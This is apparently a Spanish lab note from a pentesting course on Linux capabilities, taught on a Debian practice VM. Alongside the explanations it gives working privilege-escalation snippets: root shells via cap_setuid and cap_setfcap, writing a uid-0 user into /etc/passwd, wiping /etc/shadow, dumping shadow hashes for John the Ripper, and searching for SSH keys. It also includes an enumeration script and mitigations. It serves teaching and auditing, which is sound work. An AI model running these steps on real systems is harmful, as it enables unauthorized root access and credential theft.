---
title: "💉 Linux Capabilities — Fundamentos y Escalada de Privilegios"
aliases:
  - Linux Capabilities
  - Escalada Capabilities
  - PoC Capabilities
tags:
  - ifct0109/pocs
  - linux
  - capabilities
  - privesc
  - escalada-privilegios
---

# 💉 Linux Capabilities — Fundamentos y Escalada de Privilegios

> [!abstract] Resumen del Laboratorio
> Las **Linux Capabilities** permiten fragmentar los privilegios tradicionales del superusuario `root` en unidades independientes y granulares. Si bien fueron introducidas para mejorar la seguridad al evitar asignar el bit SUID completo a los binarios, una mala configuración de capabilities (como `cap_setuid`, `cap_dac_override` o `cap_net_bind_service`) puede abrir vectores directos de **escalada local de privilegios**.

---

# 🔐 Linux Capabilities - Escalada de Privilegios

## 📖 Preparación del Entorno

> [!warning] 🖥️ Requisitos:
>        Importar la OVA de Debian e iniciarla para realizar las prácticas.

## 📚 Introducción a Linux Capabilities

Las **capabilities (capacidades)** en Linux son una forma de dividir los privilegios del superusuario (root) en unidades más pequeñas y manejables. Esto permite que un proceso tenga solo los privilegios que necesita, en lugar de todos los privilegios que normalmente vienen con el UID 0 (root).

Este enfoque mejora la seguridad al limitar el alcance de lo que los procesos pueden hacer, incluso si están comprometidos.

#### 💡 ¿Por qué usar Capabilities?

Tradicionalmente, para realizar ciertas operaciones privilegiadas (como abrir el puerto 80), un programa necesitaba ejecutarse como root. Con capabilities:

* Un servidor web solo necesita `CAP_NET_BIND_SERVICE` para abrir puertos

### 🔑 Sets de Capacidades

Las capabilities se aplican sobre ficheros y procesos. Utilizaremos comandos como `getcap`, `setcap` y `getpcaps`. Las capabilities en ficheros tienen un juego de cinco sets:

| Set | Descripción | Uso |
| --- | --- | --- |
| Permitted | Capacidades que un proceso puede usar | Pool de capabilities disponibles para el proceso |
| Effective | Capacidades que están actualmente en uso por el proceso | Las que realmente están activas en este momento |
| Inheritable | Capacidades que un proceso puede pasar a procesos hijos | Se heredan a través de execve() |
| Bounding | Límite de las capacidades que un proceso puede adquirir | Restringe qué capabilities puede obtener un proceso |
| Ambient | Conjunto de capacidades que un proceso puede heredar automáticamente | Se preservan a través de execve() sin ser privilegiado |

## 🔧 Comandos Básicos de Capabilities

### 🔍 Ver Capabilities de un Fichero

```bash
$ getcap /ruta/al/archivo
```

**Ejemplo:**

```bash
$ getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

### 🔎 Buscar Binarios con Capabilities

```bash
# Buscar en todo el sistema (puede tardar)
$ getcap -r / 2>/dev/null

# Buscar solo en directorios comunes
$ getcap -r /usr/bin /usr/sbin /usr/local/bin 2>/dev/null
```

> [!warning] ⚠️ Importante en Pentesting:
>        Este comando es uno de los primeros que debes ejecutar al obtener acceso a un sistema Linux. Los binarios con capabilities pueden ser vectores de escalada de privilegios.

### ➕ Asignar Capabilities a un Archivo

```bash
# Sintaxis básica
$ sudo setcap CAP_NAME+flags /ruta/al/archivo

# Ejemplo: permitir que un programa escuche en puerto 80 sin ser root
$ sudo setcap cap_net_bind_service+ep /usr/bin/mi_servidor
```

#### 🔤 Significado de los Flags:

* `e` = Effective (efectiva inmediatamente)

* `p` = Permitted (permitida)

* `i` = Inheritable (heredable)

**Combinaciones comunes:**

* `+ep` - La más común: permitted y effective

* `+eip` - Permitted, effective e inheritable

### ❌ Eliminar Capabilities de un Binario

```bash
$ sudo setcap -r /path/to/binary
```

### 👁️ Ver Capabilities de un Proceso

```bash
# Ver capabilities de un proceso por PID
$ cat /proc/[PID]/status | grep Cap

# Ver capabilities del proceso actual
$ cat /proc/self/status | grep Cap

# Decodificar capabilities (más legible)
$ getpcaps [PID]
```

### 🚀 Ejecutar un Programa con Capacidades Específicas

```bash
$ sudo capsh --caps="cap_net_bind_service+ep" -- -c 'comando'
```

## 👥 Capabilities para Usuarios

Aparentemente también es posible asignar **capacidades a los usuarios**. Esto probablemente significa que cada proceso ejecutado por el usuario podrá utilizar las capacidades del usuario.

El archivo que guarda esa información está en `/etc/security/capability.conf`

### 📄 Ejemplo de Archivo de Configuración

```bash
# Simple - Una capability por usuario
cap_sys_ptrace developer
cap_net_raw user1

# Múltiples capabilities
cap_net_admin,cap_net_raw jrnetadmin

# Idéntico, pero con valores numéricos
12,13 jrnetadmin

# Combinando nombres y numéricos
cap_sys_admin,22,25 jrsysadmin
```

## ⚖️ Ventajas e Inconvenientes

#### ✅ Ventajas:

* Seguridad: Al limitar los privilegios de los procesos, se reduce el riesgo de daños si un proceso es comprometido

* Control Fino: Permite asignar solo los permisos necesarios a aplicaciones y servicios, evitando el uso del UID 0 para tareas triviales

* Auditoría y Cumplimiento: Facilita el seguimiento y la auditoría de los privilegios utilizados por diferentes procesos

* Principio de Mínimo Privilegio: Cada proceso tiene solo lo que necesita

#### ❌ Riesgos de Seguridad:

* Vector de Escalada: Capabilities mal configuradas pueden permitir escalada de privilegios

* Complejidad: Requiere conocimiento profundo para configurar correctamente

* Difícil Auditoría: Más difícil de auditar que permisos tradicionales

## 🎯 Capabilities Importantes para Pentesting

### 🔴 CAP_SETUID - Cambiar UID

Permite cambiar el UID (User ID) efectivo de un proceso, así como el UID real y el UID guardado.

**Impacto:** Es posible establecer el ID de usuario efectivo del proceso creado.

#### 💣 Exploit - Python con CAP_SETUID:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Si Python tiene `cap_setuid+ep`, este script obtendrá una shell como root.

### 🔴 CAP_SETGID - Cambiar GID

Permite cambiar el GID (Group ID) efectivo de un proceso, así como el GID real y el GID guardado.

**Impacto:** Es posible establecer el ID de grupo efectivo del proceso creado.

### 🔴 CAP_SETFCAP - Establecer Capabilities

Permite establecer las capacidades de archivos en el sistema de archivos. Un proceso con esta capacidad puede asignar y modificar las capacidades de otros archivos utilizando la herramienta `setcap`.

**Impacto:** Es posible establecer capacidades en archivos y procesos.

#### 💣 Exploit - Python con CAP_SETFCAP:

```python
import os

# Copiar python a /tmp
os.system("cp /usr/bin/python3 /tmp/python3")

# Darle CAP_SETUID+ep
os.system("setcap cap_setuid+ep /tmp/python3")

# Ejecutar el exploit de CAP_SETUID
os.system("/tmp/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
```

### 🔴 CAP_CHOWN - Cambiar Propietario

Permite cambiar el propietario y el grupo de un archivo, ignorando los permisos normales de acceso.

**Impacto:** Es posible cambiar la propiedad de cualquier archivo.

#### 💣 Exploit - Python con CAP_CHOWN:

```python
import os

# Cambiar propietario de /etc/passwd
os.chown("/etc/passwd", 1000, 1000)

# Ahora podemos modificar /etc/passwd y agregar un usuario root
# echo 'hacker:$6$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### 🔴 CAP_FOWNER - Ignorar Permisos de Propietario

Permite ignorar los permisos de propiedad de archivos al realizar ciertas operaciones.

**Impacto:** Es posible cambiar los permisos de cualquier archivo.

### 🔴 CAP_DAC_OVERRIDE - Evadir Permisos de Escritura

Permite ignorar las restricciones de Control de Acceso Discrecional (DAC), permitiendo el acceso a archivos y directorios a pesar de los permisos establecidos.

**Impacto:** Puedes evadir las comprobaciones de permisos de escritura en cualquier archivo, por lo que puedes escribir en cualquier archivo.

#### 💣 Exploit - Python con CAP_DAC_OVERRIDE:

```python
import os

# Escribir en /etc/passwd aunque no tengamos permisos
with open("/etc/passwd", "a") as f:
    f.write("hacker:$6$salt$hash:0:0:root:/root:/bin/bash\n")

# O sobrescribir /etc/shadow
os.system("echo 'root::0:::::' > /etc/shadow")
```

### 🔴 CAP_DAC_READ_SEARCH - Evadir Permisos de Lectura

Permite ignorar las restricciones de Control de Acceso Discrecional (DAC) relacionadas con la lectura de archivos y la búsqueda en directorios.

**Impacto:** Puedes burlar los controles de permisos de lectura de archivos y los controles de permisos de lectura/ejecución de directorios.

#### 💣 Exploit - Python con CAP_DAC_READ_SEARCH:

```python
import os

# Leer /etc/shadow
with open("/etc/shadow", "r") as f:
    print(f.read())

# Leer claves SSH privadas de todos los usuarios
os.system("find /home -name id_rsa 2>/dev/null")
```

### 🔴 CAP_SYS_ADMIN - Administración del Sistema

Una capacidad **amplia** que incluye numerosas tareas administrativas, como montar y desmontar sistemas de archivos, cambiar parámetros del kernel, y más.

**Impacto:** Prácticamente equivalente a root en muchos casos.

### 🔴 CAP_SYS_PTRACE - Tracing de Procesos

Permite realizar operaciones de trazado (tracing) en procesos arbitrarios usando el sistema de llamadas `ptrace`. Esto incluye la capacidad de inspeccionar y manipular la memoria y los registros de otros procesos, así como interceptar y modificar sus llamadas al sistema.

**Impacto:** Puedes escapar del contenedor inyectando un shellcode dentro de algún proceso en ejecución dentro del host.

### 🔴 CAP_SYS_MODULE - Cargar Módulos del Kernel

Permite cargar y descargar módulos del kernel. Esto incluye la capacidad de insertar nuevos módulos en el kernel o eliminar módulos existentes.

**Impacto:** Puedes insertar/eliminar módulos del kernel en/del kernel de la máquina anfitriona.

#### 💣 Exploit - Insertar Rootkit:

```bash
# Compilar un módulo del kernel malicioso
$ make

# Insertar el módulo
$ insmod rootkit.ko

# El rootkit ahora controla el kernel
```

### 🟡 CAP_KILL - Enviar Señales

Permite enviar señales a procesos que no son hijos del proceso actual, lo que es necesario para terminar procesos arbitrarios.

**Impacto:** Es posible matar cualquier proceso.

### 🟡 CAP_NET_BIND_SERVICE - Puertos Privilegiados

Permite a un proceso unir sockets a puertos reservados (números de puerto inferiores a 1024).

**Impacto:** Es posible escuchar en cualquier puerto (incluso en los privilegiados).

### 🟡 CAP_NET_RAW - Paquetes Raw

Permite enviar y recibir paquetes raw (crudos) de red. Un proceso con esta capacidad puede crear sockets raw que proporcionan acceso directo a los protocolos de red a nivel de IP.

**Impacto:** Es posible espiar el tráfico (sniffing).

### 🟡 CAP_NET_ADMIN - Administración de Red

Permite realizar diversas operaciones de administración de red, como la configuración de interfaces de red, enrutamiento y modificación de reglas de cortafuegos.

**Impacto:** Otorga al titular el poder de alterar configuraciones de red.

## 🧪 Práctica 1: CAP_NET_BIND_SERVICE

### 📋 Escenario

Queremos que un usuario sin privilegios pueda ejecutar un servidor web en el puerto 80 sin necesidad de ser root.

### 🔧 Paso 1: Crear un Servidor Web Simple en Python

```bash
$ nano webserver.py
```

Contenido del archivo:

```python
#!/usr/bin/python3
import http.server
import socketserver

PORT = 80
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Servidor escuchando en puerto {PORT}")
    httpd.serve_forever()
```

```bash
$ chmod +x webserver.py
```

### ❌ Paso 2: Intentar Ejecutar sin Capabilities

```bash
$ ./webserver.py
Traceback (most recent call last):
  ...
PermissionError: [Errno 13] Permission denied
```

❌ **Falla** porque el puerto 80 es privilegiado ( [!warning] ⚠️ Advertencia:
>        Dar capabilities a `/usr/bin/python3` es peligroso en producción. Es mejor copiar el binario:
>
>
> ```bash
$ cp /usr/bin/python3 ~/my_python
$ sudo setcap cap_net_bind_service+ep ~/my_python
$ ~/my_python webserver.py
```

### ✅ Paso 4: Verificar la Capability

```bash
$ getcap /usr/bin/python3.9
/usr/bin/python3.9 = cap_net_bind_service+ep
```

### 🚀 Paso 5: Ejecutar el Servidor

```bash
$ ./webserver.py
Servidor escuchando en puerto 80
```

✅ **¡Funciona!** Ahora un usuario sin privilegios puede abrir el puerto 80.

### 🧹 Paso 6: Limpiar (Eliminar Capability)

```bash
$ sudo setcap -r /usr/bin/python3.9
```

## 🧪 Práctica 2: CAP_SETUID - Escalada de Privilegios

### 📋 Escenario

Simulamos un escenario de pentesting donde encontramos Python con `cap_setuid+ep`.

### 🔍 Paso 1: Buscar Binarios con Capabilities

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.9 = cap_setuid+ep
```

### 💣 Paso 2: Crear el Exploit

```bash
$ nano exploit.py
```

Contenido:

```python
#!/usr/bin/python3
import os

# Cambiar UID a 0 (root)
os.setuid(0)

# Obtener shell como root
os.system("/bin/bash")
```

### 🚀 Paso 3: Ejecutar el Exploit

```bash
$ python3 exploit.py
root@debian:~# whoami
root
root@debian:~# id
uid=0(root) gid=1000(user) groups=1000(user)
```

✅ **¡Escalada exitosa!** Ahora somos root.

#### ✅ Técnicas de Mitigación:

* Nunca asignar `cap_setuid` a intérpretes (Python, Perl, Ruby)

* Usar binarios compilados específicos en su lugar

* Auditar regularmente: `getcap -r / 2>/dev/null`

* Usar AppArmor o SELinux para restringir capabilities

## 🧪 Práctica 3: CAP_DAC_READ_SEARCH - Leer /etc/shadow

### 📋 Escenario

Queremos leer archivos protegidos como `/etc/shadow` sin ser root.

### 🔧 Paso 1: Asignar la Capability a Python

```bash
$ sudo setcap cap_dac_read_search+ep /usr/bin/python3.9
```

### 💣 Paso 2: Leer /etc/shadow

```bash
$ python3 -c "print(open('/etc/shadow').read())"
root:$6$rounds=656000$...:19000:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
...
```

✅ **¡Éxito!** Podemos leer archivos protegidos.

### 🔓 Paso 3: Extraer Hashes para Crackear

```bash
$ python3 -c "print(open('/etc/shadow').read())" > shadow.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

## 🧪 Práctica 4: CAP_SETFCAP - Asignar Capabilities a Otros Binarios

### 📋 Escenario

Tenemos un binario con `cap_setfcap` y queremos usarlo para dar capabilities a otros binarios.

### 🔧 Paso 1: Asignar CAP_SETFCAP a Python

```bash
$ sudo setcap cap_setfcap+ep /usr/bin/python3.9
```

### 💣 Paso 2: Crear el Exploit

```python
#!/usr/bin/python3
import os
import subprocess

# Copiar python a /tmp
os.system("cp /usr/bin/python3 /tmp/python3_evil")

# Darle CAP_SETUID+ep usando subprocess para llamar a setcap
subprocess.call([
    "setcap",
    "cap_setuid+ep",
    "/tmp/python3_evil"
])

print("[+] Exploit completado. Ejecuta:")
print("/tmp/python3_evil -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
```

### 🚀 Paso 3: Ejecutar y Obtener Root

```python
$ python3 exploit.py
[+] Exploit completado. Ejecuta:
/tmp/python3_evil -c 'import os; os.setuid(0); os.system("/bin/bash")'

$ /tmp/python3_evil -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# whoami
root
```

## 🧪 Práctica 5: Detectar Capabilities en Pentesting

### 🔍 Script de Enumeración Automática

```python
#!/bin/bash
# capability_enum.sh - Enumerar capabilities peligrosas

echo "[*] Enumerando binarios con capabilities..."
echo ""

# Buscar todos los binarios con capabilities
getcap -r / 2>/dev/null | while read line; do
    binary=$(echo $line | cut -d' ' -f1)
    caps=$(echo $line | cut -d'=' -f2)

    echo "[+] Binario: $binary"
    echo "    Capabilities: $caps"

    # Buscar capabilities peligrosas
    if echo $caps | grep -q "cap_setuid"; then
        echo "    🔴 PELIGRO: CAP_SETUID detectado"
        echo "    Exploit: $binary -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
    fi

    if echo $caps | grep -q "cap_setfcap"; then
        echo "    🔴 PELIGRO: CAP_SETFCAP detectado"
    fi

    if echo $caps | grep -q "cap_dac_read_search"; then
        echo "    🟡 ALERTA: CAP_DAC_READ_SEARCH detectado"
    fi

    if echo $caps | grep -q "cap_dac_override"; then
        echo "    🟡 ALERTA: CAP_DAC_OVERRIDE detectado"
    fi

    echo ""
done

echo "[*] Enumeración completada."
```

### 🚀 Ejecutar el Script

```bash
$ chmod +x capability_enum.sh
$ ./capability_enum.sh
```

## 📚 Resumen y Recursos

### 🎓 Lo que hemos aprendido:

* ✅ Qué son las Linux Capabilities y por qué existen

* ✅ Cómo buscar binarios con capabilities (`getcap`)

* ✅ Cómo asignar capabilities a binarios (`setcap`)

* ✅ Capabilities peligrosas: CAP_SETUID, CAP_SETFCAP, CAP_DAC_*

* ✅ Explotar capabilities para escalada de privilegios

* ✅ Detectar y enumerar capabilities en pentesting

### 🔑 Comandos Clave:

| Comando | Descripción |
| --- | --- |
| `getcap -r / 2>/dev/null` | Buscar todos los binarios con capabilities |
| `setcap cap_name+ep binary` | Asignar capability a binario |
| `setcap -r binary` | Eliminar capabilities de binario |
| `getpcaps PID` | Ver capabilities de proceso |

### 🔗 Recursos Adicionales:

* HackTricks - Linux Capabilities

* `man capabilities` - Manual de Linux

* `man setcap` - Manual de setcap

---

## 🔗 Enlaces y Referencias Cruzadas
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice del Módulo Linux]]
* 🔐 [[02 - MODULOS/Prácticas (PoCs)/Linux/06 - Curso de Linux - Permisos, SUID, SGID y Sticky Bit|Permisos, SUID y SGID]]
* 🪐 [[02 - MODULOS/Prácticas (PoCs)/Linux/11 - Laboratorio VENUS (HackMyVM)|Laboratorio VENUS (HackMyVM)]]
